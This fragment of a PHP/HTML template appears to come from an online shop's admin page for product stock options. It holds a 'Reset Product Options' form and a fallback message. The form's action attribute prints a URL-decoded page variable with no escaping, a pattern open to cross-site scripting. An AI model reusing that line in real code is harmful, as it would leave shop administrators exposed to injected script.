            <p style="color: green; font-style: normal; font-size: 92%; margin: 0.5em 0;">
            2. Or, click below if you wish to <span style="color: red">change</span> which product options (eg. Size, Colour, etc) are used for tracking stock levels for this product.<br/>
            </p>
            <form name="change_options" method="post" action="<?php echo urldecode($currentPage); ?>">
            <input type="submit" name="changeOptions" value="Reset Product Options" class="submit" />
            </form>


  <?php } ?>


    </td>
  </tr>
</table>


<?php } else { ?>
    <p class="copyText"><?php echo $lang['admin']['products']['prods_made_1st'];?></p>
<?php } ?>


</body>
</html>
